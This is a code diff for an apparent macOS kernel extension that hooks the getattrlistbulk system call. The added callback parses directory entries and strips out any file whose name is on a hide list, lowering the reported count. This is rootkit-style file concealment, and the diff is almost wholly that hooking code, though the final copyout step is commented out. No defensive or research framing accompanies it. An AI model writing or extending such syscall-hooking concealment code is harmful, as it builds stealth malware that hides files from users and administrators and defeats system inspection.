@@ -78,7 +78,6 @@ int hide_given_directory(troy_hide_object *directory_hide)
     }
 
     my_getattrlistbulk = *((getattrlistbulk_function_prototype)(getattrlistbulk_entry_addr));
-    LOG(LOG_DEBUG, "original_my_getattrlist_ptr is %p", *my_getattrlist);
 
     return_code = SetSystemCallHandle(my_getattrlistbulk_callback, SYS_getattrlistbulk);
     if(return_code!=TROY_SUCCESS)
@@ -270,14 +269,109 @@ int my_getattrlistbulk_callback(struct proc * p,struct getattrlistbulk_args *uap
 {
     LOG(LOG_DEBUG, "I am in");
 
-    int return_code = (*my_getattrlistbulk)(p, uap, retval);
-    if(return_code!=0)
+    int return_code=TROY_SUCCESS;
+    return_code = (*my_getattrlistbulk)(p, uap, retval);
+    if(return_code<0)
     {
         LOG(LOG_ERROR, "getattrlist failed, return code is %d", return_code);
-        return return_code;
+        goto clean;
+        //return return_code;
+    }
+    LOG(LOG_ERROR, "data_entry is %d", *retval);
+    if(*retval<=0)
+    {
+        LOG(LOG_ERROR, "the number of file entries of getattrlist are not right! we will quit");
+        return_code=0;
+        goto clean;
+        //return
     }
 
-    return 0;
+    val_attrs_t *attr_data=NULL;
+    void *attr_data_address=NULL;
+    u_int64_t attr_data_size=uap->bufferSize;
+    u_int64_t remain_data_size=attr_data_size;
+
+    attr_data_address=_MALLOC(attr_data_size, M_TEMP, M_WAITOK);
+    if(attr_data_address==NULL)
+    {
+        return_code=0;
+        goto clean;
+    }
+    bzero(attr_data_address, attr_data_size);
+    copyin(uap->attributeBuffer, attr_data_address, attr_data_size);
+
+    LOG(LOG_ERROR, "attr_data_address=%p, bufferSize=%llu", attr_data_address, attr_data_size);
+
+    if(attr_data_address==NULL)
+    {
+        return_code = 0;
+        goto clean;
+    }
+
+    void *base_attr_data_addr=attr_data_address;
+
+    int num_of_file=*retval;
+    for(int file_num=0; file_num<num_of_file && attr_data_size>0 && remain_data_size>0 && *retval>0; file_num++)
+    {
+        void* attr_data_tmp_address=base_attr_data_addr;
+
+        attr_data=attr_data_tmp_address;    //get the address
+        //1. get length
+        attr_data->length=*(uint32_t*)attr_data_tmp_address;
+        attr_data_tmp_address+=sizeof(uint32_t);
+        LOG(LOG_ERROR, "length is %d", attr_data->length);
+        //2. get attribute_set_t
+        attr_data->returned=*(attribute_set_t*)attr_data_tmp_address;
+        attr_data_tmp_address+=sizeof(attribute_set_t);
+        //LOG(LOG_ERROR, "attr_data->returned.commonattr=%x", attr_data->returned.commonattr);
+        //3. get error if set error flag
+        if(attr_data->returned.commonattr&ATTR_CMN_ERROR)
+        {
+            //LOG(LOG_ERROR, "in error code");
+            attr_data->error=*(uint32_t*)attr_data_tmp_address;
+            attr_data_tmp_address+=sizeof(uint32_t);
+        }
+        //4. get file name
+        if(attr_data->returned.commonattr&ATTR_CMN_NAME)
+        {
+            attr_data->name=attr_data_tmp_address;
+            attr_data->name_info=*(attrreference_t*)attr_data_tmp_address;
+            attr_data_tmp_address+=sizeof(attrreference_t);
+            attr_data->name=(char*)((char*)attr_data->name+attr_data->name_info.attr_dataoffset);
+
+            LOG(LOG_ERROR, "file name is %s", attr_data->name);
+
+            if(!TAILQ_EMPTY(&hide_file_dirent_array))
+            {
+                struct hide_file_dirent *var=NULL, *tvar=NULL;
+                int is_find=0;
+                TAILQ_FOREACH_SAFE(var, &hide_file_dirent_array, next_ptr, tvar)
+                {
+                    LOG(LOG_ERROR, "hide name %s", var->name);
+                    if(strcmp(attr_data->name, var->name)==0)   //if find name, just hide it.
+                    {
+                        is_find=1;
+                        remain_data_size-=attr_data->length;
+                        attr_data_size-=attr_data->length;
+                        *retval-=1;
+                        LOG(LOG_ERROR, "remain_data_size=%llu", remain_data_size);
+                        bcopy((char*)attr_data+attr_data->length, (char*)attr_data,remain_data_size);
+                    }
+                }
+                if(is_find) continue;
+            }
+        }
+        remain_data_size-=attr_data->length;
+        base_attr_data_addr+=attr_data->length;
+        LOG(LOG_ERROR, "remain_data_size=%llu", remain_data_size);
+    }
+//    copyout(base_attr_data_addr, uap->attributeBuffer, attr_data_size);
+//    uap->bufferSize=attr_data_size;
+
+clean:
+    if(attr_data_address!=NULL) SAFE_FREE(attr_data_address);
+
+    return return_code;
 }
 
 
